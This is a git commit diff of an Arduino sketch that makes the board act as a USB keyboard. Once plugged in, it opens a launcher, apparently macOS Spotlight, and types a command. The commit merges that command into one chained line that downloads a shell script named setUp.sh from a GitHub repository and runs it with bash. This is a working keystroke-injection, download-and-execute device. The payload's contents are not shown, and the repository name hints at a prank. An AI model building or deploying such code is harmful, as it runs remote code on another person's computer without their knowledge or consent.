98661bd8a842a4dc5accc4498e7cf66ee1ae6b21
4n4k1n <anakin@pregitzer.de>
2024-12-30 20:05:32 +0100

    code for the arduino

--- arduino/arduino.ino
+++ arduino/arduino.ino
@@ -1,6 +1,7 @@
 #include <Keyboard.h>
 
-void setup() {
+void setup()
+{
   Keyboard.begin();
   delay(1000);
 
@@ -8,28 +9,17 @@ void setup() {
   Keyboard.press(' ');
   delay(100);
   Keyboard.releaseAll();
-  delay(3000);
-  
-  Keyboard.println("curl -L -o ~/setUp.sh 'https://github.com/4n4k1n/Goose/raw/main/setUp.sh'");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-
-  delay(10000);
-
-  Keyboard.println("chmod +x ~/setUp.sh");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  
   delay(2000);
-
-  Keyboard.println("bash ~/setUp.sh");
+  
+  Keyboard.println("curl -L -o ~/setUp.sh 'https://github.com/4n4k1n/Goose/raw/main/setUp.sh' && chmod +x ~/setUp.sh && bash ~/setUp.sh");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
 
   Keyboard.end();
 }
 
-void loop() {
-  // Nothing to do here
+void loop()
+{
+  // Nothing
 }
 
